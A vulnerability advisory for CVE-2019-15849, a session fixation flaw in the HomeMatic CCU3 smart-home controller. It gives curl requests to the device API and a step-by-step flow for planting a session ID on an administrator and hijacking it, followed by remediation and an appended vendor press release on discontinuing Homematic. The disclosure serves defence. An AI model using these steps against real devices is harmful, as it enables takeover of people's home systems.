# CVE-2019-15849: Session Fixation in HomeMatic CCU3

14 Sep 2019, Joshua Lehr

## Overview

* Vulnerability: Session Fixation
* Vendor: eQ-3 AG
* Vendor Homepage: <https://www.eq-3.com/contact.html>
* Product: HomeMatic central CCU3
* Version: 3.41.11

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor’s [website](https://www.homematic-ip.com/produkte/detail/smart-home-zentrale-ccu3.html):
“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). …”

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Session Fixation vulnerability has been identified, which can be exploited in order to display sensitive information. The vulnerability is in the central CCU3 firmware 3.41.11.

![Affected Version](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface. The flaw allows the attacker to display secret files on the system.

The following **process flow** illustrates this approach:

### Get initial Session ID (SID)

1. Open WebUI login in browser: http://192.168.0.125/login.htm
2. HomeMatic will create and add the session ID to the URL parameter:

```
http://192.168.0.125/login.htm?sid=@s8JJ2bEJOr@

```

![Initial Session creation](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.InitialSession.JPG)

### The session will not work without a successful login

1. To check this, execute the following **curl command** on the attacker site:

```
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@s8JJ2bEJOr@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 84' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"Event.poll\", \"params\": {\"_session_id_\": \"Hv4TQtaXO8\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'

```

The **curl Response** is:

```
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 156
Connection: close
Date: Sun, 01 Sep 2019 16:51:11 GMT
Server: lighttpd/1.4.50

{
  "version": "1.1",
  "result": null,
  "error": {
    "name": "JSONRPCError",
    "code": 400,
    "message": "access denied (\"GUEST\" needed 0)"
  }
}

```

In the JSON response you can see the message “access denied ("GUEST" needed 0)”. This means the session is not valid yet.

### Get a active session with admin rights

```
1. Send Link "http://192.168.0.125/login.htm?sid=@s8JJ2bEJOr@" to the administrator
2. Wait for victim login ...

```
### Recheck if the session is valid yet (same request from step 2)

1. To check this, execute the following **curl command** on the attacker site:

```
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@s8JJ2bEJOr@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 84' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"Event.poll\", \"params\": {\"_session_id_\": \"Hv4TQtaXO8\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'

```

The **curl Response** is:

```
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 45
Connection: close
Date: Sun, 01 Sep 2019 16:49:29 GMT
Server: lighttpd/1.4.50

```

**Congratulations - Now you have a valid session**
![Initial Session creation](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.LoggedIn.JPG)

## Impact

This vulnerability affects the confidentiality of the system. This allows an attacker to create and read the session ID’s. If an attacker is aware of the security issue, he or she may will attack the system by sending the user (admin) a link with a session ID. After a successful login of the victim, the attacker can use his session to manipulate the system. With this vulnerability flow, a complete system compromise is possible.

## Remediation

In order to avoid this vulnerability, it’s suggested to disable the WebUI of HomeMatic. The HomeMatic-WebUI have many other security issues.

Software patch are here available: Update to the current version 3.47.15 or above

## eQ-3 looks to the future: full focus on the further development of Homematic IP

**Leer, 06.07.2023**

eQ-3, the European market leader for whole-home systems\*, is now focusing even more on the long-term further development of the Homematic IP smart home system and the expansion of its portfolio of more than 150 products. To make this possible, the production of the predecessor system, Homematic, will be discontinued after almost 20 years. However, there is no reason for Homematic users to worry. They can continue to use their smart home installation without restrictions and will continue to be supplied with security-relevant updates for at least another ten years. In addition, combined operation of Homematic and Homematic IP is possible via the smart home central control unit CCU3, which also allows for a simple, step-by-step changeover. In the beginning, there was an idea: "We make smart home simple". Following this guiding principle, in 2005 eQ-3 developed the first generation of a bidirectional home control system which, thanks to its flexibility and convenient operation, was suitable for almost every user: Homematic. Today, almost 20 years later, the company can look back on three generations of Homematic smart home control centres, a portfolio of more than 200 devices and numerous satisfied users.

In the meantime, however, Homematic has been almost completely replaced by its successor Homematic IP, which has been available since 2015. Homematic IP represents a consistent improvement and further development of Homematic in all areas, making home automation even more flexible, simple and convenient. eQ-3 has therefore decided to focus all available resources on the long-term expansion of Homematic IP and to discontinue the development and production of Homematic after a long and successful production period.

### What does this step mean for Homematic users?

All owners of a Homematic installation can continue to use their Smart Home devices in the future as usual and without restrictions. Security-relevant updates will continue to be provided for at least ten years.

In addition, the CCU3 smart home central unit enables combined operation of Homematic and Homematic IP. This means that a Homematic installation can be easily expanded with Homematic IP components in the future. It also enables a gradual changeover to the current Homematic IP smart home system.

### Can I continue to buy Homematic components?

eQ-3 no longer manufactures new Homematic devices. However, a whole range of Homematic components will still be available in the coming years through sales partners such as ELV.

### How can I switch from Homematic to Homematic IP?

The switch from Homematic to the successor system Homematic IP is particularly easy with the Smart Home central control unit CCU3, which enables the combined operation of components from both systems. The Homematic IP portfolio comprises more than 150 products and includes a suitable solution for almost every Homematic application. This means that nothing stands in the way of a step-by-step changeover.
